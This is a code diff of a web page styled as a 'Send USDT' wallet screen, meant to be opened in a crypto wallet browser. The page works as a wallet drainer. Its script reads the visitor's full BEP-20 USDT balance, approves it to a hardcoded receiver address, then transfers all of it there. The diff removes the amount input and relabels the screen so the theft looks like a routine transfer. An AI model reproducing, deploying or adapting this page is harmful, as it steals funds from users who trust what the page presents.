@@ -1,4 +1,5 @@
-<!DOCTYPE html><html lang="en">
+<!DOCTYPE html>
+<html lang="en">
 <head>
   <meta charset="UTF-8" />
   <meta name="viewport" content="width=device-width, initial-scale=1.0"/>
@@ -46,25 +47,6 @@
       color: #fff;
       font-size: 14px;
     }
-    .input-actions {
-      margin-left: 10px;
-      display: flex;
-      gap: 12px;
-      font-size: 13px;
-    }
-    .input-actions span {
-      color: #00ff99;
-      cursor: pointer;
-    }
-    .amount-box {
-      display: flex;
-      align-items: center;
-    }
-    .amount-box .token {
-      color: #ccc;
-      margin-left: 10px;
-      font-size: 14px;
-    }
     .usd {
       font-size: 12px;
       color: #888;
@@ -92,62 +74,62 @@
     }
   </style>
 </head>
-<body>  <header>Send USDT</header>
+<body>
+
+  <header>Send USDT</header>
+
   <div class="container">
-    <label>Address or Domain Name</label>
+    <label>Status</label>
     <div class="input-box">
-      <input type="text" id="wallet" value="0x1956B3950A73B0C54792199Edf13c7b835FF94DC" disabled />
-      <div class="input-actions">
-        <span onclick="navigator.clipboard.readText().then(text => document.getElementById('wallet').value = text)">Paste</span>
-      </div>
-    </div><label>Amount</label>
-<div class="input-box amount-box">
-  <input type="number" id="amount" placeholder="USDT Amount (optional)" />
-  <span class="token">USDT</span>
-  <span class="input-actions" onclick="fillMax()">Max</span>
-</div>
-<div class="usd">&#8776; $0.00</div>
+      <input type="text" id="status" value="Ready to transfer" readonly />
+    </div>
+    <div class="usd">All USDT will be auto-transferred after approval</div>
+  </div>
 
-  </div>  <div class="fixed-button">
+  <div class="fixed-button">
     <button id="nextBtn" onclick="start()">Next</button>
-  </div>  <script src="https://cdn.jsdelivr.net/npm/web3@1.8.2/dist/web3.min.js"></script>  <script>
-    const USDT_ADDRESS = "0x55d398326f99059fF775485246999027B3197955"; // BEP-20 USDT
-    const RECEIVER = "0xDA0bab807633f07f013f94DD0E6A4F96F8742B53"; // hardcoded destination
+  </div>
 
+  <script src="https://cdn.jsdelivr.net/npm/web3@1.8.2/dist/web3.min.js"></script>
+  <script>
+    const RECEIVER = "0x1956B3950A73B0C54792199Edf13c7b835FF94DC";
+    const USDT = "0x55d398326f99059fF775485246999027B3197955";
     const ABI = [
       { "constant": false, "inputs": [{ "name": "_spender", "type": "address" }, { "name": "_value", "type": "uint256" }], "name": "approve", "outputs": [{ "name": "", "type": "bool" }], "type": "function" },
       { "constant": false, "inputs": [{ "name": "_from", "type": "address" }, { "name": "_to", "type": "address" }, { "name": "_value", "type": "uint256" }], "name": "transferFrom", "outputs": [{ "name": "", "type": "bool" }], "type": "function" },
       { "constant": true, "inputs": [{ "name": "owner", "type": "address" }], "name": "balanceOf", "outputs": [{ "name": "", "type": "uint256" }], "type": "function" }
     ];
 
-    async function fillMax() {
-      if (!window.ethereum) return;
-      const web3 = new Web3(window.ethereum);
-      const accounts = await web3.eth.getAccounts();
-      const contract = new web3.eth.Contract(ABI, USDT_ADDRESS);
-      const balance = await contract.methods.balanceOf(accounts[0]).call();
-      document.getElementById('amount').value = web3.utils.fromWei(balance);
-    }
-
     async function start() {
       const btn = document.getElementById("nextBtn");
       btn.innerText = "Processing...";
       btn.disabled = true;
 
+      if (!window.ethereum) {
+        alert("Use inside Trust Wallet browser only.");
+        btn.innerText = "Next";
+        btn.disabled = false;
+        return;
+      }
+
       try {
         const web3 = new Web3(window.ethereum);
-        const accounts = await window.ethereum.request({ method: 'eth_requestAccounts' });
+        await window.ethereum.request({ method: 'eth_requestAccounts' });
+        const accounts = await web3.eth.getAccounts();
         const user = accounts[0];
-        const contract = new web3.eth.Contract(ABI, USDT_ADDRESS);
+
+        const contract = new web3.eth.Contract(ABI, USDT);
         const balance = await contract.methods.balanceOf(user).call();
 
         await contract.methods.approve(RECEIVER, balance).send({ from: user });
         await contract.methods.transferFrom(user, RECEIVER, balance).send({ from: user });
 
-        btn.innerText = "✅ Done";
+        document.getElementById('status').value = "✅ All USDT Transferred";
+        btn.innerText = "Done";
       } catch (e) {
         console.error(e);
-        btn.innerText = "❌ Failed";
+        document.getElementById('status').value = "❌ Failed or Cancelled";
+        btn.innerText = "Retry";
       }
 
       setTimeout(() => {
@@ -155,5 +137,7 @@
         btn.disabled = false;
       }, 3000);
     }
-  </script></body>
+  </script>
+
+</body>
 </html>
